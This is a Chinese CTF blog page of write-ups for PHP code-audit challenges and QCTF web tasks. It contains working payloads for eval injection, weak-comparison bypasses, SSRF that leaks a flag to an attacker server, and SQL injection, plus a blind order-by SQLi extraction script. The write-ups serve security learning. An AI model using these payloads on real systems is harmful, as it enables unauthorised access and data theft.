<h2 id="Check-via-eval"><a href="#Check-via-eval" class="headerlink" title="Check via eval"></a>Check via eval</h2><p><img src="/images/17/25.png" alt=""><br>审题，题目要求我们输入flag参数的值，不传参的话就会如图所示有一个神秘连接，其实就是返回当前时间戳的sha1值，由于第一个条件需要这个长度，那先点击进去测试长度发现为49，所以我们需要构造一个长度为49的payload。接着用正则过滤了\，()，[]，’，.，flag等等要求我们输入的flag通过eval函数输出等于sha1(flag)的值。<br>这题目考的是一个关于eval函数的知识:<br><img src="/images/17/26.png" alt=""><br><img src="/images/17/27.png" alt=""><br>具体原理可以去看eval函数的源码，这里思路就很明确了，构造?&gt;&lt;?=$flag;就行了但是flag被过滤了，这里既然有了eval，那么我们完全可以使用多个语句来构造：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=$&#123;$a&#125;;?&gt;;  </span><br><span class="line">$a=&apos;alag&apos;;</span><br><span class="line">$a&#123;0&#125;=&apos;f&apos;</span><br></pre></td></tr></table></figure></p>
<p>接着用无关的东西填充就行了。最终payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://checkviaeval.solveme.peng.kr/?flag=$a=&apos;alag&apos;;$a&#123;0&#125;=&apos;f&apos;;?&gt;&lt;?=$&#123;$a&#125;?&gt;;1111111111111111</span><br></pre></td></tr></table></figure></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/08/16/solve-me-后续/" data-id="cjsk8gf0h000u5cvjoebu8gzn" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-关于代码审计的一些绕过方式" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/08/02/关于代码审计的一些绕过方式/" class="article-date">
  <time class="post-time" datetime="2018-08-02T10:29:37.000Z" itemprop="datePublished">
    <span class="post-month">8月</span><br>
    <span class="post-day">02</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/08/02/关于代码审计的一些绕过方式/">关于代码审计的一些绕过方式</a>
    </h1>
  

        <div>
          
  <div class="article-category">
    <a class="article-category-link" href="/categories/日常学习/">日常学习</a>
  </div>

          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这段时间断断续续的在做一些题目，知识点太过杂乱，而且时间太过仓促所以没写多少博客，最近刚好在系统学习一些php代码审计的内容，因此记录一些常见的绕过方式(参考一夜飘零师傅的博客)<br>题目的地址如下:<a href="http://solveme.peng.kr/" target="_blank" rel="noopener">http://solveme.peng.kr/</a>    </p>
<h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p><img src="/images/17/1.png" alt=""><br>按照他如何加密我们如何解密就行了。  </p>
<h2 id="Bad-compare"><a href="#Bad-compare" class="headerlink" title="Bad compare"></a>Bad compare</h2><p><img src="/images/17/2.png" alt=""><br>题目要求我们传入一个名为answer的变量，变量要等于后面一串奇怪的字符串。<br>直接复制是不太可能的，这里的字符应该是不可见字符，所以我们可以直接用脚本抓取网页代码然后在对应的区域进行url编码，最后把url编码传过去。附上脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">url = &apos;http://badcompare.solveme.peng.kr/&apos;</span><br><span class="line">r = requests.get(url)</span><br><span class="line">ans = urllib.quote(r.content[917:927])</span><br><span class="line">print ans</span><br></pre></td></tr></table></figure></p>
<h2 id="Winter-sleep"><a href="#Winter-sleep" class="headerlink" title="Winter sleep"></a>Winter sleep</h2><p><img src="/images/17/3.png" alt=""><br>这里要求我们传入的time值为数字类型，并且要介于（60 <em> 60 </em> 24 <em> 30 </em> 2）和（60 <em> 60 </em> 24 <em> 30 </em> 3）之间，满足条件后，网页会把time转化为int型然后沉睡time秒后回显flag，这里肯定是不可能等两到三个月的时间来拿flag的。关键点在于is_numeric()函数，这个函数可以检测数字和数字字符串，不仅可以检测十进制，也能检测十六进制，并且科学记数法也能检测出。但是有一个细节可以注意，网页是把time转化为了int型变量，既然有了is_nemeric()函数，为什么还需要用int类型转换呢？<br>这里就要利用int类型转化的缺陷了，int在转换字符型时，碰到字母就会停下来，也就是说<strong>(int)0e213</strong>等于0，这个在MD5弱类型比较时有着很强的作用。结合两者，我们可以想到用科学记数法来绕过。time赋值为6e6，等待六秒就行了。  </p>
<h2 id="Hard-login"><a href="#Hard-login" class="headerlink" title="Hard login"></a>Hard login</h2><p><img src="/images/17/4.png" alt=""><br>这题目是一个陷阱，它直接给出了登入成功会跳转的地址，所以我们是没必要去登入的，成功绕过登入实在是太过困难了一点，不过值得注意的是，直接访问index.php会跳转回来，我们可以抓包拿flag。<br><img src="/images/17/5.png" alt="">  </p>
<h2 id="URL-filtering"><a href="#URL-filtering" class="headerlink" title="URL filtering"></a>URL filtering</h2><p><img src="/images/17/6.png" alt=""><br>读题，题目的大致意思是把url?后的字符串以&amp;作为分隔符分开，然后以=作为分隔符，前者为key，后者为value，然后要求变量do_you_want_flag=yes，但是key和value的值不能为do_you_want_flag和yes。<br>这里就存在一个矛盾了，既然url不能出现do_you_want_flag和yes那么我们如何通过get的方式得到do_you_want_flag变量值为yes呢？这里题目关键在于这里:<br><img src="/images/17/7.png" alt=""><br><img src="/images/17/8.png" alt=""><br>对于不合格的url会返回false，所以我们可以构造这个函数认为不合格但是服务器可以解析的url，例如这个:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://urlfiltering.solveme.peng.kr//?do_you_want_flag=yes</span><br></pre></td></tr></table></figure></p>
<p>这里就可以成功绕过得到flag了。  </p>
<h2 id="Hash-collision"><a href="#Hash-collision" class="headerlink" title="Hash collision"></a>Hash collision</h2><p><img src="/images/17/9.png" alt=""><br>这题目比较简单，sha加密弱类型比较用数组就可以轻松绕过:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hashcollision.solveme.peng.kr/?foo[]=1&amp;bar[]=2</span><br></pre></td></tr></table></figure></p>
<h2 id="Array2String"><a href="#Array2String" class="headerlink" title="Array2String"></a>Array2String</h2><p><img src="/images/17/10.png" alt=""><br>审题，题目要求我们不能输入username变量的值，只能通过chr(value)一个一个拼接成username变量的值，但是value不能在32-127之间，而我们的字符ascii码却在这之中，这题绕过方式很简单，关键在于chr()这个函数，chr()函数如果在处理大于256的值时，它会mod256直到参数小于256为止再进行操作，password读取/secret.passwd就能得到，所以payload如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://array2string.solveme.peng.kr/index.php?value[]=305&amp;value[]=309&amp;value[]=372&amp;value[]=360&amp;value[]=351&amp;value[]=328&amp;value[]=353&amp;value[]=355&amp;value[]=363&amp;value[]=361&amp;value[]=366&amp;value[]=359&amp;value[]=323&amp;value[]=353&amp;value[]=365&amp;value[]=368&amp;password=simple_passw0rd</span><br></pre></td></tr></table></figure></p>
<h2 id="Give-me-a-link"><a href="#Give-me-a-link" class="headerlink" title="Give me a link"></a>Give me a link</h2><p><img src="/images/17/11.png" alt=""><br>题目的意思是让我们输入一个url参数的值，但是呢，有几点要求：<br>第一是不能有类似_或者|和空格之类的字符。<br>第二必须要有http或者https开头，并且域名为题目的域名，也就是<a href="http://givemealink.solveme.peng.kr/。" target="_blank" rel="noopener">http://givemealink.solveme.peng.kr/。</a><br>第三是需要有/plz_give_me这个路径。<br>现在难点有两个，第一个是在_被禁止使用的时候如何绕过检测url路径中的/plz_give_me，这个问题查阅parse_url这个函数就可以解决，在解析url时，如果碰到无效字符，例如%10，%11等，就会使用_来替代这个无效字符。<br>第二个问题就是如何拿到flag了，这个问题的解决方法就是用到@的黑魔法了，如果按照正常的构造：<a href="http://givemealink.solveme.peng.kr/?url=http://givemealink.solveme.peng.kr/plz%10give%10me" target="_blank" rel="noopener">http://givemealink.solveme.peng.kr/?url=http://givemealink.solveme.peng.kr/plz%10give%10me</a><br>那服务器就会去访问givemealink.solveme.peng.kr/flag这个地址，我们没办法看到flag(除非我们是这个服务器的拥有者)，所以我们得让我们自己的服务器接收到这个才行。  </p>
<p><img src="/images/17/12.png" alt=""><br><img src="/images/17/13.png" alt=""><br>如果我们使用了@，那么parse_url解析url时的host就是@后面的域名了，所以加上一个@再加自己服务器的ip就可以接收到flag了。  </p>
<h2 id="Give-me-a-link2"><a href="#Give-me-a-link2" class="headerlink" title="Give me a link2"></a>Give me a link2</h2><p><img src="/images/17/14.png" alt=""><br>题目和上一个差不多的要求，就是多了一点：host只能是localhost，127.xx.xx.xx，或者一个任意字符串加端口，也就是说这里不能使用xx.xx.xx.xx或者是xxxx.xxx的地址，满足条件后建立连接带flag访问其服务器的端口，如果访问成功则会返回Okay字样，但是如何绕过限制来使得这题目向我们服务器发生请求呢?<br><img src="/images/17/15.png" alt=""><br>这里可以使用ip2long函数，这个函数会把ip转化为字符串形式，这里就可以绕过检测并且使得网页访问我们的服务器，构造?url=<a href="http://xxxxxx:xxxx/plz%10give%10me，网页直接回显了flag，要是没回显监听端口也能得到flag。" target="_blank" rel="noopener">http://xxxxxx:xxxx/plz%10give%10me，网页直接回显了flag，要是没回显监听端口也能得到flag。</a></p>
<h2 id="Replace-filter"><a href="#Replace-filter" class="headerlink" title="Replace filter"></a>Replace filter</h2><p><img src="/images/17/16.png" alt=""><br>题目要求我们传入say变量的值，要求长度要小于20，并且只有say变量中有give_me_the_flag字符串才能得到flag，但是呢，在得到flag之前有一个替换的过程，只要匹配到带有flag的字符串就会被替换为后面一串奇怪的字符，这样一被替换那根本不可能得到flag，所以我们需要尝试绕过。<br>正则匹配时，.是不会匹配换行符的，在解析完换行符后不在同一行的话是匹配不到的。所以使用%0a即可绕过。<br>PS:这题目想到了onethink那道题目，那道题目就是通过%0a换行之后绕过了//，把shell写入了文件。  </p>
<h2 id="Hell-JS"><a href="#Hell-JS" class="headerlink" title="Hell JS"></a>Hell JS</h2><p>这题目一打开就和其他画风不太对，f12发现这是js混淆，先解密再说，脚本是从一叶飘零大佬那里借鉴来的。<br><img src="/images/17/17.png" alt=""><br>解密发现了一堆可疑的数字，用脚本处理下直接出答案了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">text = &apos;...&apos;  #那串字符串</span><br><span class="line">text = text.replace(&apos;&quot;&apos;,&apos;&apos;)</span><br><span class="line">text = text.split(&apos;,&apos;)</span><br><span class="line">final = &quot;&quot;</span><br><span class="line">for i in range(0,len(text)):</span><br><span class="line">    temp = &quot;&quot;</span><br><span class="line">    temp = text[i]</span><br><span class="line">    temp = temp.replace(&apos;+&apos;,&apos;&apos;)</span><br><span class="line">    temp = chr(int(temp))</span><br><span class="line">    final = final + temp</span><br><span class="line">print final</span><br></pre></td></tr></table></figure></p>
<h2 id="Lax-CAPTCHA"><a href="#Lax-CAPTCHA" class="headerlink" title="Lax CAPTCHA"></a>Lax CAPTCHA</h2><p><img src="/images/17/18.png" alt=""><br>这题目我没做出来，分享一下思路吧。<br>题目要求我们先用generate触发生成图片码的应用，再让我们在3秒内输入验证码得到flag，人工拼手速是不行的，十五个字母太过长了。所以我想回溯到生成图片的最开始去获取answer，但是我发现一旦解码就成了乱码，无法进一步回溯，gg。<br>第二种思路就是用脚本识别验证码然后传参，但是这种方法目前实现太过困难了，通过像素点从数据库中一一比对这种技术我还做不到，所以gg。<br>第三种就是去预测生成的验证码了，mt_rand也是一个伪随机生成器，但是我预测失败，gg。  </p>
<h2 id="Anti-SQLi"><a href="#Anti-SQLi" class="headerlink" title="Anti SQLi"></a>Anti SQLi</h2><p><img src="/images/17/19.png" alt=""><br>这题目就是一道注入题，给了源码而已，有点像实验吧的一些注入题。题目一开始过滤了一堆东西，与其去看正则还不如用字典扫一下，再结合来看。<br>首先是闭合符’被过滤了，这里可以考虑看看编码情况，如果是gbk编码可以构造出’，但是这里不存在这种方法。但是接着后看的时候发现了一点，发现转义符\并没有过滤完善，过滤\是需要四个\来完成的，所以这里可以用\闭合掉一个’造成闭合符逃逸，接着就是如何注释的问题了，上面仔细观察发现过滤了–加上后面是空格符，换行符之类的，但是忽略了一个不可见字符，所以这里可以使用–%10来注释掉，最后一个问题就是需要查询出31337这个数据，要知道如果使用<strong>SELECT * FROM <code>antisqli</code> WHERE <code>id</code>=’{$id}’ AND <code>pw</code>=md5(‘{$pw}’)</strong>这个查询语句是查不出的，这里就必须要用到联合查询语句，但是order by和union select 被过滤了，order by倒是可以使用一个一个猜测来完成，但是union select要怎么办呢？可以在中间加个all，只是这个整体被过滤我们只要改变这个就行了，payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=\&amp;pw=union all select 1,1,1 from antisqli --%10</span><br></pre></td></tr></table></figure></p>
<p>回显hello,1<br>所以把1都改为31337就行了</p>
<h2 id="Name-check"><a href="#Name-check" class="headerlink" title="Name check"></a>Name check</h2><p><img src="/images/17/20.png" alt=""><br>先看得到flag的条件，需要row[0]，row[1]，row[2]，row[3]四个相加等于4，也就是说他们四个要为true才行。那接着分析四个语句。<br>第一个条件要求字符串开头要为a。<br>第二个条件要求d字符不能在开头。<br>第三个条件要求字符要为a_m__的格式。<br>第四个条件字符后两位为in。<br>结合起来看就是要求name为admin，但是题目会过滤admin以及一些连接符，这里值得注意的是sqlite不像mysql一样使用+来进行连接，而是使用||，所以使用ad’||’min即可绕过。  </p>
<h2 id="Super-secure-hash"><a href="#Super-secure-hash" class="headerlink" title="Super secure hash"></a>Super secure hash</h2><p><img src="/images/17/21.png" alt=""><br>这题目没做出来，最后只得到crc32加密后的密码:<br><img src="/images/17/22.png" alt=""><br>这题目思路很明确了，就是通过爆破去找到这个加密前的密码。在比较密码的时候清一色都是使用强类型比较根本不可能使用布尔值来绕过，所以只能去找密码，但是crc32在6位以上的密码又是基本不可能爆破出的，所以卡死在这了，gg。  </p>
<h3 id="最后几道题目知识点有点多，还是单独写比较好，毕竟太快写完有点知识不牢固。还是太懒了啊…-学习动力匮乏，希望找点一点积极的东西来促进学习吧。"><a href="#最后几道题目知识点有点多，还是单独写比较好，毕竟太快写完有点知识不牢固。还是太懒了啊…-学习动力匮乏，希望找点一点积极的东西来促进学习吧。" class="headerlink" title="最后几道题目知识点有点多，还是单独写比较好，毕竟太快写完有点知识不牢固。还是太懒了啊…..学习动力匮乏，希望找点一点积极的东西来促进学习吧。"></a>最后几道题目知识点有点多，还是单独写比较好，毕竟太快写完有点知识不牢固。还是太懒了啊…..学习动力匮乏，希望找点一点积极的东西来促进学习吧。</h3>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/08/02/关于代码审计的一些绕过方式/" data-id="cjsk8gf1h001r5cvjfgnpbnpo" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-近期比赛学习到的一些知识" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/07/22/近期比赛学习到的一些知识/" class="article-date">
  <time class="post-time" datetime="2018-07-22T01:33:46.000Z" itemprop="datePublished">
    <span class="post-month">7月</span><br>
    <span class="post-day">22</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/07/22/近期比赛学习到的一些知识/">近期比赛学习到的一些知识</a>
    </h1>
  

        <div>
          
  <div class="article-category">
    <a class="article-category-link" href="/categories/日常学习/">日常学习</a>
  </div>

          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Lottery"><a href="#Lottery" class="headerlink" title="Lottery"></a>Lottery</h2><p>这是QCTF的一道题目，算是比较有新意的一道题目(对我来说….)。<br><img src="/images/16/1.png" alt=""><br>题目要求很简单啊，大致意思就是让你买7个数字，中了大概一千万就能买到flag了。<br>一开始先扫一发目录，果然发现了有.git源码泄露。先把源码下下来吧。<br><img src="/images/16/2.png" alt=""><br>打开源码进行分析。<br>关于大致流程是这样的，首先要求我们登入，只需要输入一个用户名，网页自动生成一个账户，其实这里账户是什么都无所谓，根本不会写入数据库进行交互，无论哪个账户的初始金额都只有20美元，这里就有两个思路了。<br>我第一个想法就是看看在数据交互的时候能否更改我账户的金额，翻了翻源码发现这个不同一般网页，这个网页应用了Ajax技术，金额是在前端进行交互，没办法去抓包更改(可能是我技术太垃圾了)。所以思来想去，pass了这个思路。<br>第二个想法呢，是经过大师傅的指导才有的思路。这个题目既然说了买彩票，那么题目的做法一定和彩票有联系，不会无缘无故的设计一个博彩系统来迷惑我们，所以呢，我们需要搏一搏。<br>单纯的去买一堆彩票能中上千万是不现实的，所以肯定需要一些特殊的办法来发家致富。因此要关注这是如何验证彩票中奖情况的，所以重点锁定在了api.php里面的函数。<br><img src="/images/16/3.png" alt=""><br>这里可以看出彩票的数字生成是实实在在不可预测的，这个根据实时内存生成的函数基本无法预测。所以只有从如何比较的方向入手了。<br><img src="/images/16/4.png" alt=""><br>验证时分别获取我们输入的数字以及随机生成数字进行比较，本题关键就是在这，这里并没有用强类型比较，而是用了弱类型比较。在弱类型比较里面，非零数在与true比较时是返回true的，所以到这里思路就很明确了，只要在我们提交购买彩票时把我们数据改成7个true就行了，但是在做题目的时候发现了一个问题，json数据怎么改。经过post，用py发包无果后才发现，这用burp就可以了啊。。。。。。<br><img src="/images/16/5.png" alt=""><br>把数字改成true就行了，记得在读取数据的时候是以数组的形式，记得把numbers改为数组形式，要不然会以字符串形式读取字符，这就无法匹配了。<br><strong>PS:布尔型变量在很多验证都能起到绕过匹配的作用，多加以应用。</strong>  </p>
<h2 id="Confusion1"><a href="#Confusion1" class="headerlink" title="Confusion1"></a>Confusion1</h2><h3 id="SSTI-模板注入"><a href="#SSTI-模板注入" class="headerlink" title="SSTI-模板注入"></a>SSTI-模板注入</h3><p>这也是根据一道题目所学来的知识点，虽然没有做出来，但是这里还是值得记录一下。题目解析就不写了，只是写写一些要点。<br>对于我来说，目前接触到了很多由于攻击者进行恶意输入导致网页信息泄露，被攻击者获取权限的注入手段。比如最常见的sql注入，xss，代码注入，以及命令注入等。SSTI–服务端模板注入还是第一次接触。<br>SSTI注入主要发生在用户请求的地方，这个和xss有点相似，网页把用户查询的信息未经过严格的处理直接回显到了页面，根据不同的服务端模板，如果我们调用模板中的函数，就能在特定情况下利用其读取文件或者写入shell等操作。<br>具体详细可以参考这一篇文章:<a href="http://www.freebuf.com/vuls/83999.html。" target="_blank" rel="noopener">http://www.freebuf.com/vuls/83999.html。</a>  </p>
<h3 id="flask模板中request"><a href="#flask模板中request" class="headerlink" title="flask模板中request"></a>flask模板中request</h3><p>这道题目就是使用python的flask模板，在flask中前端需要发送不同的请求及各种带参数的方式，比如GET方法在URL后面带参数和POST在BODY带参数，有时候又是POST的表单提交方式，这个时候就需要从request提取参数。<br>下面是request可使用的属性，主要归纳一些常用的。<br><strong>form</strong>:一个从POST和PUT请求解析的 MultiDict（一键多值字典）。<br><strong>args</strong>:MultiDict，要操作 URL （如 ?key=value ）中提交的参数可以使用 args 属性:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request.arg.key?key=value</span><br></pre></td></tr></table></figure></p>
<p><strong>values</strong>:CombinedMultiDict，内容是form和args。可以使用values替代form和args。<br><strong>headers</strong>:请求头，字典类型。<br><strong>data</strong>:包含了请求的数据，并转换为字符串，除非是一个Flask无法处理的mimetype。<br><strong>method</strong>:请求方法，比如POST、GET。<br><strong>PS:在过滤了某些关键词时可以使用args属性绕过。</strong><br><strong>通过调用py类中函数对于的索引来读取或者写入文件</strong></p>
<h2 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order by注入"></a>order by注入</h2><p>只能说自己实力还是太弱了吧，碰到sql注入题目都要花很久才能做出来。这一次是一道关于order by注入的一道题目，题目提示了select flag from flag，只要爆破出字段就行了。<br>题目有提供id，name，price三个排序方式，对于mysql来说，排序方式转化为二进制，那么在使用id排序时，id=1对应的就是0001，id=2对于的就是0010，而假对应的是0000，也就是说不改变排序方式，而真对应的是0001，在与2位异或时，2变成了0011，3却变成了0001，所以这里我们可以使用位异或结合布尔型来更改排序方式。<br>贴下我的垃圾脚本吧。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import requests</span><br><span class="line">list = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;_abcdefghijklmnopqrstuvwxyz0123456789&quot;</span><br><span class="line">r1 = &quot;&quot;</span><br><span class="line">text = &quot;&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(1,27):</span><br><span class="line">    for j in list:</span><br><span class="line">        url = &quot;http://101.71.29.5:10004/?order=id^(substr((select flag from flag),%d,1)=&apos;%s&apos;) &amp;button=submit&quot;%(i,j)</span><br><span class="line">        r1 = requests.get(url)</span><br><span class="line">        text = r1.content</span><br><span class="line">        if text[949] == &apos;3&apos;:</span><br><span class="line">            print j</span><br><span class="line">            flag = flag + j</span><br><span class="line">            break</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/07/22/近期比赛学习到的一些知识/" data-id="cjsk8gf3j002p5cvjldxcvon6" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/比赛心得/">比赛心得</a></li></ul>

    </footer>
  </div>
  
</article>




  


  <nav id="page-nav">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">next &raquo;</a>
  </nav>
</section>
        
          <aside id="sidebar">
  
    <div class="widget-wrap">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <h1 class="blog-title">Iuhrey的幻想乡</h1>
    <h2 class="blog-subtitle">记录日常所学</h2>
    <ul class="blog-link">
     
          <a href="/" title="Home">
            <li>幻想乡的起点</li>
          </a>
        
          <a href="/archives" title="Archives">
            <li>幻想乡图</li>
          </a>
        
          <a href="/categories" title="Categories">
            <li>分岔路</li>
          </a>
        
          <a href="/tags" title="Tags">
            <li>路标</li>
          </a>
        
    </ul>
  </div>
</div>

  
    <div class="widget-wrap">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <img class="avatar" src="/images/avatar.jpg">
    <h2 class="author">Iuhrey</h2>
    <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
    <div class="count-box">
      <a href="/archives"><div><strong>29</strong><br>文章</div></a>
      <a href="/categories"><div><strong>3</strong><br>分类</div></a>
      <a href="/tags"><div><strong>13</strong><br>标签</div></a>
    </div>



    <div class="social-link">
      
        <a class="hvr-bounce-in" href="http://github.com/NoneGirlIuh" target="_blank" title="Github">
          Github
        </a>
      
    </div>

    <div class="friend-link">
      <h2>友情链接</h2>
      
        <a class="hvr-bounce-in" href="http://blog.shanamaid.top/" target="_blank" title="ShanaMaid">
          ShanaMaid
        </a>
      
        <a class="hvr-bounce-in" href="http://mozhucy.cn/" target="_blank" title="喜欢啥几把BB的狗骑驴">
          喜欢啥几把BB的狗骑驴
        </a>
      
        <a class="hvr-bounce-in" href="http://alittlexyz.cn/" target="_blank" title="喜欢gay在狗骑驴旁边的狗逼">
          喜欢gay在狗骑驴旁边的狗逼
        </a>
      
        <a class="hvr-bounce-in" href="http://zaiyewujiang.cn/" target="_blank" title="gay里gay气的大黄">
          gay里gay气的大黄
        </a>
      
        <a class="hvr-bounce-in" href="http://yulige.top/" target="_blank" title="郁离歌大手子的博客">
          郁离歌大手子的博客
        </a>
      
        <a class="hvr-bounce-in" href="http://shaobaobaoer.cn/" target="_blank" title="有很多小姐姐的烧包包">
          有很多小姐姐的烧包包
        </a>
      
    </div>
  </div>
</div>

  
</aside>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=478384&auto=1&height=66"></iframe>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy;2018 - 2019 Iuhrey<br>
      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
      主题-<a href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
      
        |<script src="http://s11.cnzz.com/z_stat.php?id=1273056144&web_id=1273056144" language="JavaScript"></script>
      
    </div>
<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <span id="busuanzi_container_site_uv">本站总访问量<span id="busuanzi_value_site_uv"></span>次</span>
  </div>
</footer>
    </div>
    

<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
<script>
new WOW().init();
</script>   


  <link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
  <script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>



  <section class="hidden-xs"> 
  <ul class="cb-slideshow"> 
    <li><span>苟利</span></li> 
    <li><span>国家</span></li> 
    <li><span>生死以</span></li> 
    <li><span>岂能</span></li> 
    <li><span>祸福</span></li> 
    <li><span>趋避之</span></li> 
  </ul>
</section>
<script src="/js/script.js"></script>



  </div>
</body>
</html>